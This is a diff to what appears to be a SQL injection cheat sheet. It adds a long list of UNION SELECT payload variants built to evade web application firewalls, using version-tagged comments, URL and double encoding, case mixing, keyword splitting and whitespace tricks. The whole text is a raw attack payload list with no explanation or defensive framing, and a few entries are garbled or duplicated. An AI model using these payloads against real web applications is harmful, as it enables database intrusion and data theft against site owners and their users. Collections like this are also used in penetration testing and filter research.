@@ -190,7 +190,44 @@ AND 0 UNION(SELECT(1),(2),(3),(4),(5),(6),(7),(8),(9))
 +and+(select 1)=(Select 0xAA[..(add about 1000 “A”)..])+/*!uNIOn*/+/*!SeLECt*/+1,2
  /*!u%6eion*/ /*!se%6cect*/ 1,2,3,4
 -15+uni*on+sel*ect+1,2,3,4
-
++union+distinctROW+select+
+/**//*!12345UNION SELECT*//**/
+/**//*!50000UNION SELECT*//**/
+/**/UNION/**//*!50000SELECT*//**/
+/*!50000UniON SeLeCt*/
+union /*!50000%53elect*/
++#uNiOn+#sEleCt
++#1q%0AuNiOn all#qa%0A#%0AsEleCt
+/*!%55NiOn*/ /*!%53eLEct*/
+/*!u%6eion*/ /*!se%6cect*/
++un/**/ion+se/**/lect
+uni%0bon+se%0blect
+%2f**%2funion%2f**%2fselect
+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A
+REVERSE(noinu)+REVERSE(tceles)
+/*--*/union/*--*/select/*--*/
+union (/*!/**/ SeleCT */ 1,2,3)
+/*!union*/+/*!select*/
+union+/*!select*/
+/**/union/**/select/**/
+/**/uNIon/**/sEleCt/**/
++%2F**/+Union/*!select*/
+/**//*!union*//**//*!select*//**/
+/*!uNIOn*/ /*!SelECt*/
++union+distinct+select+
++union+distinctROW+select+
+uNiOn aLl sElEcT
+UNIunionON+SELselectECT
+/**/union/*!50000select*//**/
+0%a0union%a0select%09
+%0Aunion%0Aselect%0A
+%55nion/**/%53elect
+uni<on all="" sel="">/*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/
+%252f%252a*/UNION%252f%252a /SELECT%252f%252a*/
+%0A%09UNION%0CSELECT%10NULL%
+/*!union*//*--*//*!all*//*--*//*!select*/
+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1% 2C2%2C
+/*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/
 ```
 
 
